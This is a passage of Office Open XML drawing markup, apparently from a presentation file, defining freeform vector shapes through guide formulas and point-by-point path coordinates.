                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1AC7D7B5-8AF9-44A7-AF84-F8B0C46A5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0600" y="4820457"/>
              <a:ext cx="21336" cy="21337"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 46 w 46"/>
                <a:gd name="T1" fmla="*/ 23 h 46"/>
                <a:gd name="T2" fmla="*/ 46 w 46"/>
                <a:gd name="T3" fmla="*/ 23 h 46"/>
                <a:gd name="T4" fmla="*/ 44 w 46"/>
                <a:gd name="T5" fmla="*/ 33 h 46"/>
                <a:gd name="T6" fmla="*/ 41 w 46"/>
                <a:gd name="T7" fmla="*/ 41 h 46"/>
                <a:gd name="T8" fmla="*/ 33 w 46"/>
                <a:gd name="T9" fmla="*/ 45 h 46"/>
                <a:gd name="T10" fmla="*/ 23 w 46"/>
                <a:gd name="T11" fmla="*/ 46 h 46"/>
                <a:gd name="T12" fmla="*/ 23 w 46"/>
                <a:gd name="T13" fmla="*/ 46 h 46"/>
                <a:gd name="T14" fmla="*/ 13 w 46"/>
                <a:gd name="T15" fmla="*/ 45 h 46"/>
                <a:gd name="T16" fmla="*/ 6 w 46"/>
                <a:gd name="T17" fmla="*/ 41 h 46"/>
                <a:gd name="T18" fmla="*/ 2 w 46"/>
                <a:gd name="T19" fmla="*/ 33 h 46"/>
                <a:gd name="T20" fmla="*/ 0 w 46"/>
                <a:gd name="T21" fmla="*/ 23 h 46"/>
                <a:gd name="T22" fmla="*/ 0 w 46"/>
                <a:gd name="T23" fmla="*/ 23 h 46"/>
                <a:gd name="T24" fmla="*/ 2 w 46"/>
                <a:gd name="T25" fmla="*/ 13 h 46"/>
                <a:gd name="T26" fmla="*/ 6 w 46"/>
                <a:gd name="T27" fmla="*/ 6 h 46"/>
                <a:gd name="T28" fmla="*/ 13 w 46"/>
                <a:gd name="T29" fmla="*/ 2 h 46"/>
                <a:gd name="T30" fmla="*/ 23 w 46"/>
                <a:gd name="T31" fmla="*/ 0 h 46"/>
                <a:gd name="T32" fmla="*/ 23 w 46"/>
                <a:gd name="T33" fmla="*/ 0 h 46"/>
                <a:gd name="T34" fmla="*/ 33 w 46"/>
                <a:gd name="T35" fmla="*/ 2 h 46"/>
                <a:gd name="T36" fmla="*/ 41 w 46"/>
                <a:gd name="T37" fmla="*/ 6 h 46"/>
                <a:gd name="T38" fmla="*/ 44 w 46"/>
                <a:gd name="T39" fmla="*/ 13 h 46"/>
                <a:gd name="T40" fmla="*/ 46 w 46"/>
                <a:gd name="T41" fmla="*/ 23 h 46"/>
                <a:gd name="T42" fmla="*/ 46 w 46"/>
                <a:gd name="T43" fmla="*/ 2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6" h="46">
                  <a:moveTo>
                    <a:pt x="46" y="23"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="46" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="44" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="41" y="41"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="33" y="45"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="46"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="46"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13" y="45"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6" y="41"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="33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2" y="13"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13" y="2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33" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="41" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="44" y="13"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46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6" name="Freeform 87">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5CD9C7E4-212C-4367-B16B-BFAC6405F3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09617" y="4741141"/>
              <a:ext cx="44064" cy="127091"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 93 w 95"/>
                <a:gd name="T1" fmla="*/ 64 h 274"/>
                <a:gd name="T2" fmla="*/ 91 w 95"/>
                <a:gd name="T3" fmla="*/ 196 h 274"/>
                <a:gd name="T4" fmla="*/ 91 w 95"/>
                <a:gd name="T5" fmla="*/ 227 h 274"/>
                <a:gd name="T6" fmla="*/ 87 w 95"/>
                <a:gd name="T7" fmla="*/ 245 h 274"/>
                <a:gd name="T8" fmla="*/ 81 w 95"/>
                <a:gd name="T9" fmla="*/ 256 h 274"/>
                <a:gd name="T10" fmla="*/ 69 w 95"/>
                <a:gd name="T11" fmla="*/ 266 h 274"/>
                <a:gd name="T12" fmla="*/ 38 w 95"/>
                <a:gd name="T13" fmla="*/ 274 h 274"/>
                <a:gd name="T14" fmla="*/ 23 w 95"/>
                <a:gd name="T15" fmla="*/ 274 h 274"/>
                <a:gd name="T16" fmla="*/ 3 w 95"/>
                <a:gd name="T17" fmla="*/ 262 h 274"/>
                <a:gd name="T18" fmla="*/ 0 w 95"/>
                <a:gd name="T19" fmla="*/ 252 h 274"/>
                <a:gd name="T20" fmla="*/ 2 w 95"/>
                <a:gd name="T21" fmla="*/ 247 h 274"/>
                <a:gd name="T22" fmla="*/ 13 w 95"/>
                <a:gd name="T23" fmla="*/ 239 h 274"/>
                <a:gd name="T24" fmla="*/ 21 w 95"/>
                <a:gd name="T25" fmla="*/ 237 h 274"/>
                <a:gd name="T26" fmla="*/ 33 w 95"/>
                <a:gd name="T27" fmla="*/ 241 h 274"/>
                <a:gd name="T28" fmla="*/ 35 w 95"/>
                <a:gd name="T29" fmla="*/ 254 h 274"/>
                <a:gd name="T30" fmla="*/ 36 w 95"/>
                <a:gd name="T31" fmla="*/ 260 h 274"/>
                <a:gd name="T32" fmla="*/ 42 w 95"/>
                <a:gd name="T33" fmla="*/ 266 h 274"/>
                <a:gd name="T34" fmla="*/ 44 w 95"/>
                <a:gd name="T35" fmla="*/ 268 h 274"/>
                <a:gd name="T36" fmla="*/ 54 w 95"/>
                <a:gd name="T37" fmla="*/ 262 h 274"/>
                <a:gd name="T38" fmla="*/ 58 w 95"/>
                <a:gd name="T39" fmla="*/ 247 h 274"/>
                <a:gd name="T40" fmla="*/ 58 w 95"/>
                <a:gd name="T41" fmla="*/ 235 h 274"/>
                <a:gd name="T42" fmla="*/ 56 w 95"/>
                <a:gd name="T43" fmla="*/ 204 h 274"/>
                <a:gd name="T44" fmla="*/ 56 w 95"/>
                <a:gd name="T45" fmla="*/ 101 h 274"/>
                <a:gd name="T46" fmla="*/ 56 w 95"/>
                <a:gd name="T47" fmla="*/ 82 h 274"/>
                <a:gd name="T48" fmla="*/ 50 w 95"/>
                <a:gd name="T49" fmla="*/ 76 h 274"/>
                <a:gd name="T50" fmla="*/ 35 w 95"/>
                <a:gd name="T51" fmla="*/ 74 h 274"/>
                <a:gd name="T52" fmla="*/ 93 w 95"/>
                <a:gd name="T53" fmla="*/ 64 h 274"/>
                <a:gd name="T54" fmla="*/ 73 w 95"/>
                <a:gd name="T55" fmla="*/ 0 h 274"/>
                <a:gd name="T56" fmla="*/ 89 w 95"/>
                <a:gd name="T57" fmla="*/ 6 h 274"/>
                <a:gd name="T58" fmla="*/ 95 w 95"/>
                <a:gd name="T59" fmla="*/ 20 h 274"/>
                <a:gd name="T60" fmla="*/ 93 w 95"/>
                <a:gd name="T61" fmla="*/ 27 h 274"/>
                <a:gd name="T62" fmla="*/ 81 w 95"/>
                <a:gd name="T63" fmla="*/ 39 h 274"/>
                <a:gd name="T64" fmla="*/ 73 w 95"/>
                <a:gd name="T65" fmla="*/ 39 h 274"/>
                <a:gd name="T66" fmla="*/ 60 w 95"/>
                <a:gd name="T67" fmla="*/ 33 h 274"/>
                <a:gd name="T68" fmla="*/ 54 w 95"/>
                <a:gd name="T69" fmla="*/ 20 h 274"/>
                <a:gd name="T70" fmla="*/ 56 w 95"/>
                <a:gd name="T71" fmla="*/ 12 h 274"/>
                <a:gd name="T72" fmla="*/ 66 w 95"/>
                <a:gd name="T73" fmla="*/ 2 h 274"/>
                <a:gd name="T74" fmla="*/ 73 w 95"/>
                <a:gd name="T75" fmla="*/ 0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5" h="274">
                  <a:moveTo>
                    <a:pt x="93" y="64"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="93" y="64"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="91" y="120"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="91" y="196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="91" y="196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="91" y="227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="87" y="245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="87" y="245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="85" y="250"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="81" y="256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="75" y="262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="69" y="266"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="272"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="274"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="274"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="274"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11" y="268"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3" y="262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="252"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="252"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="247"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5" y="241"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13" y="239"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29" y="239"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="33" y="241"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="33" y="241"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="35" y="254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="35" y="254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="36" y="260"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="264"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42" y="266"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="44" y="268"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="44" y="268"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50" y="266"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="247"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="247"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="86"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="82"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="78"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50" y="76"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46" y="76"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="35" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="35" y="68"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="93" y="64"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="73" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="73" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="81" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="89" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="93" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="95" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="95" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="93" y="27"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="89" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="81" y="39"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="73" y="39"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="73" y="39"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="39"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="27"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="73" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7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7" name="Freeform 88">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1D2D2DCE-8FCC-4BE2-BBBC-5082D48F56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66205" y="4770827"/>
              <a:ext cx="73750" cy="98333"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 54 w 159"/>
                <a:gd name="T1" fmla="*/ 22 h 212"/>
                <a:gd name="T2" fmla="*/ 76 w 159"/>
                <a:gd name="T3" fmla="*/ 4 h 212"/>
                <a:gd name="T4" fmla="*/ 99 w 159"/>
                <a:gd name="T5" fmla="*/ 0 h 212"/>
                <a:gd name="T6" fmla="*/ 112 w 159"/>
                <a:gd name="T7" fmla="*/ 0 h 212"/>
                <a:gd name="T8" fmla="*/ 136 w 159"/>
                <a:gd name="T9" fmla="*/ 10 h 212"/>
                <a:gd name="T10" fmla="*/ 149 w 159"/>
                <a:gd name="T11" fmla="*/ 29 h 212"/>
                <a:gd name="T12" fmla="*/ 157 w 159"/>
                <a:gd name="T13" fmla="*/ 56 h 212"/>
                <a:gd name="T14" fmla="*/ 159 w 159"/>
                <a:gd name="T15" fmla="*/ 72 h 212"/>
                <a:gd name="T16" fmla="*/ 153 w 159"/>
                <a:gd name="T17" fmla="*/ 107 h 212"/>
                <a:gd name="T18" fmla="*/ 142 w 159"/>
                <a:gd name="T19" fmla="*/ 132 h 212"/>
                <a:gd name="T20" fmla="*/ 132 w 159"/>
                <a:gd name="T21" fmla="*/ 142 h 212"/>
                <a:gd name="T22" fmla="*/ 109 w 159"/>
                <a:gd name="T23" fmla="*/ 152 h 212"/>
                <a:gd name="T24" fmla="*/ 93 w 159"/>
                <a:gd name="T25" fmla="*/ 153 h 212"/>
                <a:gd name="T26" fmla="*/ 74 w 159"/>
                <a:gd name="T27" fmla="*/ 150 h 212"/>
                <a:gd name="T28" fmla="*/ 54 w 159"/>
                <a:gd name="T29" fmla="*/ 138 h 212"/>
                <a:gd name="T30" fmla="*/ 54 w 159"/>
                <a:gd name="T31" fmla="*/ 177 h 212"/>
                <a:gd name="T32" fmla="*/ 56 w 159"/>
                <a:gd name="T33" fmla="*/ 196 h 212"/>
                <a:gd name="T34" fmla="*/ 62 w 159"/>
                <a:gd name="T35" fmla="*/ 202 h 212"/>
                <a:gd name="T36" fmla="*/ 77 w 159"/>
                <a:gd name="T37" fmla="*/ 204 h 212"/>
                <a:gd name="T38" fmla="*/ 0 w 159"/>
                <a:gd name="T39" fmla="*/ 212 h 212"/>
                <a:gd name="T40" fmla="*/ 0 w 159"/>
                <a:gd name="T41" fmla="*/ 204 h 212"/>
                <a:gd name="T42" fmla="*/ 15 w 159"/>
                <a:gd name="T43" fmla="*/ 202 h 212"/>
                <a:gd name="T44" fmla="*/ 21 w 159"/>
                <a:gd name="T45" fmla="*/ 192 h 212"/>
                <a:gd name="T46" fmla="*/ 21 w 159"/>
                <a:gd name="T47" fmla="*/ 37 h 212"/>
                <a:gd name="T48" fmla="*/ 21 w 159"/>
                <a:gd name="T49" fmla="*/ 23 h 212"/>
                <a:gd name="T50" fmla="*/ 15 w 159"/>
                <a:gd name="T51" fmla="*/ 12 h 212"/>
                <a:gd name="T52" fmla="*/ 0 w 159"/>
                <a:gd name="T53" fmla="*/ 10 h 212"/>
                <a:gd name="T54" fmla="*/ 54 w 159"/>
                <a:gd name="T55" fmla="*/ 0 h 212"/>
                <a:gd name="T56" fmla="*/ 62 w 159"/>
                <a:gd name="T57" fmla="*/ 128 h 212"/>
                <a:gd name="T58" fmla="*/ 66 w 159"/>
                <a:gd name="T59" fmla="*/ 134 h 212"/>
                <a:gd name="T60" fmla="*/ 79 w 159"/>
                <a:gd name="T61" fmla="*/ 144 h 212"/>
                <a:gd name="T62" fmla="*/ 87 w 159"/>
                <a:gd name="T63" fmla="*/ 146 h 212"/>
                <a:gd name="T64" fmla="*/ 103 w 159"/>
                <a:gd name="T65" fmla="*/ 142 h 212"/>
                <a:gd name="T66" fmla="*/ 112 w 159"/>
                <a:gd name="T67" fmla="*/ 128 h 212"/>
                <a:gd name="T68" fmla="*/ 118 w 159"/>
                <a:gd name="T69" fmla="*/ 107 h 212"/>
                <a:gd name="T70" fmla="*/ 122 w 159"/>
                <a:gd name="T71" fmla="*/ 76 h 212"/>
                <a:gd name="T72" fmla="*/ 120 w 159"/>
                <a:gd name="T73" fmla="*/ 47 h 212"/>
                <a:gd name="T74" fmla="*/ 114 w 159"/>
                <a:gd name="T75" fmla="*/ 25 h 212"/>
                <a:gd name="T76" fmla="*/ 105 w 159"/>
                <a:gd name="T77" fmla="*/ 12 h 212"/>
                <a:gd name="T78" fmla="*/ 91 w 159"/>
                <a:gd name="T79" fmla="*/ 8 h 212"/>
                <a:gd name="T80" fmla="*/ 83 w 159"/>
                <a:gd name="T81" fmla="*/ 10 h 212"/>
                <a:gd name="T82" fmla="*/ 70 w 159"/>
                <a:gd name="T83" fmla="*/ 20 h 212"/>
                <a:gd name="T84" fmla="*/ 60 w 159"/>
                <a:gd name="T85" fmla="*/ 37 h 212"/>
                <a:gd name="T86" fmla="*/ 54 w 159"/>
                <a:gd name="T87" fmla="*/ 64 h 212"/>
                <a:gd name="T88" fmla="*/ 54 w 159"/>
                <a:gd name="T89" fmla="*/ 80 h 212"/>
                <a:gd name="T90" fmla="*/ 58 w 159"/>
                <a:gd name="T91" fmla="*/ 119 h 212"/>
                <a:gd name="T92" fmla="*/ 62 w 159"/>
                <a:gd name="T93" fmla="*/ 128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59" h="212">
                  <a:moveTo>
                    <a:pt x="54" y="22"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="54" y="22"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="76" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="87" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="112" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="124" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="136" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="143" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="149" y="29"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="155" y="41"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="157" y="56"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="159" y="72"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="159" y="72"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="157" y="91"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="153" y="107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="149" y="120"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="142" y="132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="142" y="132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="132" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="120" y="148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="109" y="152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="93" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="93" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62" y="202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="77" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="77" y="212"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="212"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="16"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="22"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="62" y="128"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="62" y="128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="72" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="79" y="144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="87" y="146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="87" y="146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="95" y="144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="109" y="136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="112" y="128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="116" y="119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="118" y="107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="120" y="93"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="122" y="76"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="122" y="76"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="120" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="116" y="35"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="114" y="25"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="109" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="105" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="97" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="91" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="91" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="76" y="14"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="70" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="27"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="51"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="64"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="80"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="80"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62" y="128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62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48" name="Freeform 80">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F1CB7411-EDB9-4382-9D17-707A2A7AE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1067" y="4770827"/>
              <a:ext cx="47775" cy="70967"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 11 w 103"/>
                <a:gd name="T1" fmla="*/ 101 h 153"/>
                <a:gd name="T2" fmla="*/ 15 w 103"/>
                <a:gd name="T3" fmla="*/ 117 h 153"/>
                <a:gd name="T4" fmla="*/ 21 w 103"/>
                <a:gd name="T5" fmla="*/ 130 h 153"/>
                <a:gd name="T6" fmla="*/ 35 w 103"/>
                <a:gd name="T7" fmla="*/ 142 h 153"/>
                <a:gd name="T8" fmla="*/ 52 w 103"/>
                <a:gd name="T9" fmla="*/ 148 h 153"/>
                <a:gd name="T10" fmla="*/ 64 w 103"/>
                <a:gd name="T11" fmla="*/ 146 h 153"/>
                <a:gd name="T12" fmla="*/ 77 w 103"/>
                <a:gd name="T13" fmla="*/ 132 h 153"/>
                <a:gd name="T14" fmla="*/ 79 w 103"/>
                <a:gd name="T15" fmla="*/ 122 h 153"/>
                <a:gd name="T16" fmla="*/ 72 w 103"/>
                <a:gd name="T17" fmla="*/ 105 h 153"/>
                <a:gd name="T18" fmla="*/ 41 w 103"/>
                <a:gd name="T19" fmla="*/ 88 h 153"/>
                <a:gd name="T20" fmla="*/ 21 w 103"/>
                <a:gd name="T21" fmla="*/ 78 h 153"/>
                <a:gd name="T22" fmla="*/ 9 w 103"/>
                <a:gd name="T23" fmla="*/ 68 h 153"/>
                <a:gd name="T24" fmla="*/ 2 w 103"/>
                <a:gd name="T25" fmla="*/ 56 h 153"/>
                <a:gd name="T26" fmla="*/ 0 w 103"/>
